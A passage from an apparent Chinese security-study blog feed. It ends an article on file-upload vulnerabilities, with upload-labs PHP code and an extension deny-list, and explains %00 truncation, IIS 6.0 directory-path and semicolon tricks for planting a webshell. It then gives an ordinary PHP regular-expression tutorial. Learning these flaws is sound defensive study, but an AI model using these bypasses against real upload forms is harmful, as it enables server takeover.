array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);<br>        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);<br>        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);<br>        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写<br>        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA<br>        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空<br>        <br>        if (!in_array($file_ext, $deny_ext)) &#123;<br>            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;<br>                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;<br>                $is_upload &#x3D; true;<br>            &#125;<br>        &#125; else &#123;<br>            $msg &#x3D; &#39;此文件不允许上传&#39;;<br>        &#125;<br>    &#125; else &#123;<br>        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;<br>    &#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>  因为这个漏洞利用是服务端解析文件时截断目录的漏洞，所以这里我就贴了一个禁止所有可执行文件上传的代码。这里有必要解释一下客户端读取文件类型和服务端读取文件类型的方式了，就是它们都看后缀名，也就是看<code>.</code>后面的东西，一般都是直接看最后一个<code>.</code>后面的东西就是后缀名。hacker就是也是利用这一点，上传一个被允许的文件，然后抓包截断，在上传路径后面添加一个含有两个文件后缀的字符串，中间用一个符号隔开，在burp的hex栏中修改这个符号的值为00，然后放包上传，最后到服务端就会被存储为可执行文件，以达到获取网站webshell的目的。</p></li><li><h5 id="目录路径检测解析漏洞："><a href="#目录路径检测解析漏洞：" class="headerlink" title="目录路径检测解析漏洞："></a>目录路径检测解析漏洞：</h5><p>  目录路径解析是基于IIS6.0服务器管理软件的功能，是指上传上去文件路径在一定程度上可以被修改，说通俗点就是可以在站点文件下在建一个文件（一般这个文件是可执行文件）。这个漏洞是利用IIS6.0太过于遵守正常思维下文件目录格式，是文件夹就是文件夹，是可执行文件就是可执行文件。</p><p>     因为这是服务器管理软件的漏洞，所以这里有没有代码就没必要了。hacker一般都是直接抓取流量包，在上传路径下加一个可执行文件的名字（比如，在burp抓到的包中原路径是<code>upload</code>，然后改成<code>upload/test.php</code>），再在已经通过本地验证过的文件里加上恶意代码。因为计算机之间流通的是计算机语言，IIS6.0将原本hacker上传文件读入到新生成的可执行文件下，就是一串代码，这样hacker的恶意代码就会被执行。</p><p>     这里再说一个IIS6.0的文件解析漏洞：主要是用到<code>;</code>，IIS6.0在解析一个文件名的时候会将<code>;</code>当成截断符，而不解析分号后面的内容。hacker利用该漏洞的思想有点类似%00截断，只是利用方法稍微会简单点，也就是抓包后在上传路径下加一个可执行文件的名字并用分号结束（比如，在burp抓到的包中原路径是<code>upload</code>，然后改成<code>upload/test.php;</code>），再在已经通过本地验证过的文件里加上恶意代码。</p></li></ol><p>  目前我知道的经典上传漏洞大致分为上面这几大类，这些应该只是冰山一角，还有更多的上传漏洞以后遇到了就补上来。如果有什么记录错或者记录的不完整的地方，还请大佬们点名批评，批评通道：1394850274</p><p>参考文献：upload-labs，杰奇网站漏洞。</p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP正则表达式小结</title>
    <link href="/2021/05/09/PHP%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%B0%8F%E7%BB%93/"/>
    <url>/2021/05/09/PHP%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP正则表达式小结"><a href="#PHP正则表达式小结" class="headerlink" title="PHP正则表达式小结"></a>PHP正则表达式小结</h1><h3 id="感悟："><a href="#感悟：" class="headerlink" title="感悟："></a>感悟：</h3><p>  为了锻炼我们自己的编码能力，这个寒假准备利用<code>php+html+css+mysql</code>开发一个本地web小网站。在学习的过程中，我重新认识了一遍正则表达式，借用这个机会，将这次的认识记录起来，以免过段时间忘了一些细节。相对以前而言，我觉得这次对正则表达式的认识也有个十之七八了。</p><hr><h3 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h3><p>  简单的介绍一下谈诉我对正则表达式概念的理解，简单的说正则表达式有点像在描述一个或一类字符串的特征，这里的特征通常表现为一串或者一类具有共同特点的字符串（如果说这个特征是一段固定的字符串，它就类似于子串的概念），这个特征通常用来对其他的字符串进行匹配、查找、替换、分割等操作！正则表达式处理字符串的能力十分强大，但并不是所有处理字符串的操作都用到正则表达式，只有在对一些特别复杂的字符串进行操作的时候才会考虑是否使用正则表达式。</p><p>  在PHP中，正则表达式一般通过与三个特定的函数配合使用（<code>preg_match()、preg_match_all()、preg_replace()</code>）。</p><p>简单介绍一下这三个函数的作用：</p><ol><li><p><code>preg_match()</code>：搜索<code>subject</code>与<code>pattern</code>给定的正则表达式的一个匹配。找到一次就停止。</p><p>原型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] )<br></code></pre></td></tr></table></figure><p>参数：</p><ul><li><p><code>pattern</code>：要搜索的模式（特征），字符串类型。</p></li><li><p><code>subject</code>：被搜索的模板字符串。</p></li><li><p><code>matches</code>:如果提供了参数<code>matches</code>，它将被填充为搜索结果。 <code>$matches[0]</code>将包含完整模式匹配到的文本， <code>$matches[1]</code>将包含第一个捕获子组匹配到的文本，以此类推。</p></li><li><p><code>flags</code>：可以被设置为以下标记值：</p><ul><li><strong>PREG_OFFSET_CAPTURE</strong>如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到<code>matches</code>参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串<code>subject</code>中的偏移量。</li></ul></li><li><p><code>offset</code>：搜索从目标字符串的开始位置开始。可选参数 <code>offset</code> 用于 指定从目标字符串的某个位置开始搜索(单位是字节)。</p></li></ul><p>返回值：</p><ul><li>返回 <code>pattern</code> 的匹配次数。 它的值将是0次（不匹配）或1次，在第一次匹配后 将会停止搜索。</li></ul></li><li><p><code>preg_match_all()</code>：搜索 subject 中所有匹配 pattern 给定正则表达式的匹配结果并且将它们以 flag 指定顺序输出到 matches 中。在第一个匹配找到后, 子序列继续从最后一次匹配位置搜索。</p><p>原型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int preg_match_all ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; PREG_PATTERN_ORDER [, int $offset &#x3D; 0 ]]] )<br></code></pre></td></tr></table></figure><p>参数：</p><ul><li><p><code>$pattern</code>: 要搜索的模式，字符串形式。</p></li><li><p><code>$subject</code>: 输入字符串。</p></li><li><p><code>$matches</code>: 多维数组，作为输出参数输出所有匹配结果, 数组排序通过flags指定。</p></li><li><p><code>$flags</code>：可以结合下面标记使用(注意不能同时使用<code>PREG_PATTERN_ORDER</code>和<code>PREG_SET_ORDER</code>)：</p><ul><li><code>PREG_PATTERN_ORDER</code>: 结果排序为<code>$matches[0]</code>保存完整模式的所有匹配, <code>$matches[1]</code>保存第一个子组的所有匹配，以此类推。</li></ul></li></ul></li></ol><ul><li><code>PREG_SET_ORDER</code>: 结果排序为<code>$matches[0]</code>包含第一次匹配得到的所有匹配(包含子组)， <code>$matches[1]</code>是包含第二次匹配到的所有匹配(包含子组)的数组，以此类推。<ul><li><code>PREG_OFFSET_CAPTURE</code>: 如果这个标记被传递，每个发现的匹配返回时会增加它相对目标字符串的偏移量。</li></ul></li><li><code>offset</code>: 通常， 查找时从目标字符串的开始位置开始。可选参数<code>offset</code>用于 从目标字符串中指定位置开始搜索(单位是字节)。</li></ul><p>   返回值：</p><ul><li>返回完整匹配次数（可能是0），或者如果发生错误返回FALSE。</li></ul><ol start="3"><li><p><code>preg_replace()</code>:搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p><p>原型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )<br></code></pre></td></tr></table></figure><p>参数：</p><ul><li><code>$pattern</code>: 要搜索的模式，可以是字符串或一个字符串数组。</li><li><code>$replacement</code>: 用于替换的字符串或字符串数组。</li><li><code>$subject</code>: 要搜索替换的目标字符串或字符串数组。</li><li><code>$limit</code>: 可选，对于每个模式用于每个<code>$subject</code> 字符串的最大可替换次数。 默认是-1（无限制）。</li><li><code>$count</code>: 可选，为替换执行的次数。</li></ul><p>返回值：</p><ul><li>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。</li><li>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</li></ul></li></ol><h4 id="正则表达式："><a href="#正则表达式：" class="headerlink" title="正则表达式："></a>正则表达式：</h4><p>下面选择用preg_match_all()配合正则表达式进行介绍操作字符串的过程。</p><p>  正则表达式的语法规则：由一个或多个普通字符或者元字符组成的一个字符串，由定界符<code>/</code>来表示正则表达式的开始和结束格式为<code>/特征字符串/</code>！此外，正则表达式还可以用除字母、数字和反斜线以外的字符作为定界符，例如<code>#、！、&#123;&#125;、|</code>等，但要保证始末位置的定界符一致。</p><ol><li><h5 id="普通字符："><a href="#普通字符：" class="headerlink" title="普通字符："></a>普通字符：</h5><p>一般情况下指的都是26个英文字母（a到z）包括大小写、阿拉伯数字0-9、单引号和双引号。</p><ul><li><p>纯普通字符匹配举例：</p></li><li><p>```php+HTML</p><?php    $pattern='/test/';//此时的$pattern就是一个存储有正则表达式的变量    $str="testTestTEXT";//该字符串为被搜索的字符串    var_dump(preg_match_all($pattern, $str, $arr));    var_dump($arr);?><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><br>  结果：<br><br>- ```php+HTML<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">//preg_match_all的返回值，表示在字符串搜索到一次</span><br>  <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//preg_match_all创建的数组，表示匹配到字符串的值和偏移量</span><br>    [<span class="hljs-number">0</span>]=&gt;<br>    <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>      [<span class="hljs-number">0</span>]=&gt;<br>      <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure></li><li></li></ul></li><li><h5 id="元字符："><a href="#元字符：" class="headerlink" title="元字符："></a>元字符：</h5><p>能对正则表达式特征进行概括，代表某一类字符串，有特殊功能的字符（比如*、+、？等）。</p><ul><li><p>含元字符举例：</p></li><li><p><code>\d</code>和<code>\D</code>：前者表示任意十进制数（0-9）中的一个字符，后者表示除任意十进制数（0-9）外的其他字符中的一个字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$pattern&#x3D;&#39;&#x2F;t\dst&#x2F;&#39;;&#x2F;&#x2F;\d匹配十进制数<br>$str&#x3D;&quot;t1stTestTEXT&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br>&#x2F;*该结果成功，可匹配<br>&lt;?php<br>$pattern&#x3D;&#39;&#x2F;t\Dst&#x2F;&#39;;&#x2F;&#x2F;\D匹配除十进制数外的一个字符<br>$str&#x3D;&quot;testTestTEXT&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;*&#x2F;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>    [<span class="hljs-number">0</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;t1st&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>\s</code>和<code>\S</code>：前者表示任意空白字符（换页符、换行符、回车符、制表符、垂直制表符）中的一个字符，后者表示除空白字符（换页符、换行符、回车符、制表符、垂直制表符）外的其他字符中的一个字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/t\sst/&#x27;</span>;<span class="hljs-comment">//\s匹配空白字符</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;t\nstTst\tstTEXT&quot;</span>;<span class="hljs-comment">//该字符串为被搜索的字符串</span><br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*该结果成功，可匹配</span><br><span class="hljs-comment">&lt;?php</span><br><span class="hljs-comment">$pattern=&#x27;/t\Sst/&#x27;;//\S匹配除空白字符外的一个字符</span><br><span class="hljs-comment">$str=&quot;testTestTEXT&quot;;//该字符串为被搜索的字符串</span><br><span class="hljs-comment">var_dump(preg_match_all($pattern, $str, $arr));</span><br><span class="hljs-comment">var_dump($arr);</span><br><span class="hljs-comment">?&gt;*/</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>    [<span class="hljs-number">0</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;t</span><br><span class="hljs-string">st&quot;</span><br>    [<span class="hljs-number">1</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;tst&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>\w</code>和<code>\W</code>：前者表示任意数字或字母或下划线中的一个字符，后者表示除任意数字或字母或下划线外的其他字符中的一个字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/t\wst/&#x27;</span>;<span class="hljs-comment">//\w匹配任意数字或字母或下划线</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;t_stTstastTEXT&quot;</span>;<span class="hljs-comment">//该字符串为被搜索的字符串</span><br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*该结果成功，可匹配</span><br><span class="hljs-comment">&lt;?php</span><br><span class="hljs-comment">$pattern=&#x27;/t\Wst/&#x27;;//\W匹配除任意数字或字母或下划线外的一个字符</span><br><span class="hljs-comment">$str=&quot;testTestTEXT&quot;;//该字符串为被搜索的字符串</span><br><span class="hljs-comment">var_dump(preg_match_all($pattern, $str, $arr));</span><br><span class="hljs-comment">var_dump($arr);</span><br><span class="hljs-comment">?&gt;*/</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int(2)<br>array(1) &#123;<br>  [0]&#x3D;&gt;<br>  array(2) &#123;<br>    [0]&#x3D;&gt;<br>    string(4) &quot;t_st&quot;<br>    [1]&#x3D;&gt;<br>    string(4) &quot;tast&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>.</code>：表示除换行符外的任意一个字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$pattern&#x3D;&#39;&#x2F;t.st&#x2F;&#39;;&#x2F;&#x2F;\d匹配除换行符外的任意一个字符<br>$str&#x3D;&quot;t_stTstastTEXT&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">int(2)<br>array(1) &#123;<br>  [0]&#x3D;&gt;<br>  array(2) &#123;<br>    [0]&#x3D;&gt;<br>    string(4) &quot;t_st&quot;<br>    [1]&#x3D;&gt;<br>    string(4) &quot;tast&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>*</code>、<code>+</code>和<code>？</code>：<code>*</code>表示只含其前面第一个字符并连续重复0次，或1次，或多次的一串字符串；<code>+</code>表示只含其前面第一个字符并连续重复1次，或多次的一串字符串；<code>？</code>表示只含其前面第一个字符并连续重复0次，或1次的一个字符。（注：重复0次就是任意代表任意一个字符，与其前面的第一个字符无关）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>$pattern&#x3D;&#39;&#x2F;te*st&#x2F;&#39;;&#x2F;&#x2F;*匹配只含其前面第一个字符并连续重复0次，或1次，或多次的一串字符串<br>$str&#x3D;&quot;tsttestteeeestTEXT&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br>&lt;?php<br>$pattern&#x3D;&#39;&#x2F;te+st&#x2F;&#39;;&#x2F;&#x2F;+匹配只含其前面第一个字符并连续重复1次，或多次的一串字符串<br>$str&#x3D;&quot;tsttestteeeestTEXT&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br>&lt;?php<br>$pattern&#x3D;&#39;&#x2F;te?st&#x2F;&#39;;&#x2F;&#x2F;?匹配只含其前面第一个字符并连续重复0次，或1次的一个字符<br>$str&#x3D;&quot;tsttestteeeestTEXT&quot;;&#x2F;&#x2F;该字符串为被搜索的字符串<br>var_dump(preg_match_all($pattern, $str, $arr));<br>var_dump($arr);<br>?&gt;<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//*</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">3</span>)<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) &#123;<br>    [<span class="hljs-number">0</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;tst&quot;</span><br>    [<span class="hljs-number">1</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>    [<span class="hljs-number">2</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;teeeest&quot;</span><br>  &#125;<br>&#125;<br><span class="hljs-comment">//+</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>    [<span class="hljs-number">0</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>    [<span class="hljs-number">1</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;teeeest&quot;</span><br>  &#125;<br>&#125;<br><span class="hljs-comment">//?</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>    [<span class="hljs-number">0</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;tst&quot;</span><br>    [<span class="hljs-number">1</span>]=&gt;<br>    <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>&#123;n&#125;</code>、<code>&#123;n,&#125;</code>和<code>&#123;n,m&#125;</code>：<code>&#123;n&#125;</code>表示只含其前面第一个字符并正好连续出现n次的一串字符；<code>&#123;n,&#125;</code>表示只含其前面第一个字符并至少连续出现n次的一串字符；<code>&#123;n,m&#125;</code>表示只含其前面第一个字符并至少连续出现n次，至多出现m次的一串字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/te&#123;0&#125;st/&#x27;</span>;<span class="hljs-comment">//&#123;n&#125;匹配只含其前面第一个字符并正好连续出现n次的一串字符</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;tsttestteeeestTEXT&quot;</span>;<span class="hljs-comment">//该字符串为被搜索的字符串</span><br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/te&#123;0,&#125;st/&#x27;</span>;<span class="hljs-comment">//&#123;n,&#125;匹配只含其前面第一个字符并至少连续出现n次的一串字符</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;tsttestteeeestTEXT&quot;</span>;<span class="hljs-comment">//该字符串为被搜索的字符串</span><br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$pattern</span>=<span class="hljs-string">&#x27;/te&#123;0,2&#125;st/&#x27;</span>;<span class="hljs-comment">//&#123;n,m&#125;匹配十进制数</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;tsttestteeeestTEXT&quot;</span>;<span class="hljs-comment">//该字符串为被搜索的字符串</span><br>var_dump(preg_match_all(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$arr</span>));<br>var_dump(<span class="hljs-variable">$arr</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 